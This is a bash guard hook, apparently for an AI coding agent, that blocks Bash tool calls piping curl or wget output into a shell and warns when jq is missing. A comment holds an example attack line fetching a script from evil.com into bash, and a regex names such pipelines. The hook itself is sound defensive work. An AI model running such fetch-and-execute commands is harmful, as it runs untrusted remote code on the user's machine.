#!/bin/bash
# no-wget-piped-bash.sh — Block curl/wget piped directly to bash
#
# Prevents: Arbitrary code execution from untrusted URLs.
#           Pattern: curl https://evil.com/script.sh | bash
#
# TRIGGER: PreToolUse
# MATCHER: "Bash"

# Without jq, the parse below silently yields empty and this hook stops
# guarding - with no error anywhere. Say so. We deliberately do not exit
# here: blocking would halt every tool call, and exiting 0 would change
# the behaviour of guards that do not depend on the parsed value.
if ! command -v jq >/dev/null 2>&1; then
  _nojq_warned="/tmp/cc-nojq-warned-no-wget-piped-bash-$PPID"
  [ -f "$_nojq_warned" ] || {
    echo "WARNING [no-wget-piped-bash]: jq not found - this hook cannot inspect tool calls and is NOT protecting you. Install jq." >&2
    : > "$_nojq_warned"
  }
fi

INPUT=$(cat)
COMMAND=$(echo "$INPUT" | jq -r '.tool_input.command // empty' 2>/dev/null)
[ -z "$COMMAND" ] && exit 0

# Detect curl/wget piped to sh/bash
if echo "$COMMAND" | grep -qE '(curl|wget)\s.*\|\s*(sudo\s+)?(bash|sh|zsh|source|eval)'; then
  echo "BLOCKED: Piping remote script directly to shell is dangerous." >&2
  echo "  Download first, review, then execute:" >&2
  echo "  curl -o script.sh URL && cat script.sh && bash script.sh" >&2
  exit 2
fi

exit 0
